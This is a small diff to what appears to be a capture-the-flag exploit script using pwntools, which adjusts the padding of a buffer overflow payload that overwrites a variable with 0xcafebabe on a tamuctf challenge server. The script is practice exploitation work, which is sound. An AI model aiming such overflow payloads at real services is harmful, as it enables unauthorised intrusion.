@@ -2,7 +2,7 @@ from pwn import *
 
 # variable overwrite
 io = remote('pwn.tamuctf.com', 4321)
-payload = b'A' * 64 + p64(0xcafebabe)
+payload = b'A' * (0x50-0x4) + p64(0xcafebabe)
 io.sendline(payload)
 io.interactive()
 
